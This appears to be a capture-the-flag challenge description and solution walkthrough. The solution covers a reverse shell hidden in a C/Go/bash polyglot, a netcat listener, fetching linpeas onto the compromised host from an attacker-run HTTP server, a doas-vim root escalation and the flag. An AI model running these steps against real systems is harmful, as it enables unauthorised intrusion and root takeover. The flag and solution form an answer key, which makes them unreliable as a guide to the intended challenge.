# Lingo master
Proposed difficulty: medium

Jeg snakker rigtig mange sprog, snakker du mange sprog? Hvis du gerne vil lære flere sprog, så besøg [http://lingomaster.hkn](http://lingomaster.hkn)


# Solution

1) Writing polyglot file

    Write a polyglot file that is accepted as C, Go and bash (See a valid polyglot in `/sol` - Remember to change IP and port number!!!!!!). The bash part of the file will be executed, therefore the participant has to write a reverse shell.

2)  Getting a foothold

* Set up a `nc` listener to some port (5001 in this case):
    ```bash
    $ nc lv <some-available-port>
    ```

* Setting up a python HTTP server:
Firstly, make sure to [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) in the current working directory, then run the python HTTP server:
    ```bash
    python3 -m http.server <a-new-port-number>
    ```

* Download from the self hosted HTTP server from hacked machine:
  Find your own IP address

  Download from hacked machine server:
  ```bash
  wget http://<your-ip-address>:<python-server-port-number>/linpeas.sh
  ```
    This will output a lot of information, but the linpeas shows a doas (alternative to sudo) configuration:
    ```bash
    ╔══════════╣ Checking doas.conf
    permit nopass polyglot as root cmd vim
    ``` 

    This says that the user `polyglot` can execute vim as root without a password using doas.
    
1) Vim priv esc
Simply running the following with make vim execute a shell as root:

    `doas vim -c ':!/bin/sh'`

8) Get the flag
    ```bash
    $ cat flag.txt
    cat flag.txt
    DDC{foreigner_speaks_fluent_mandarin_and_shocks_everyone}
    ```


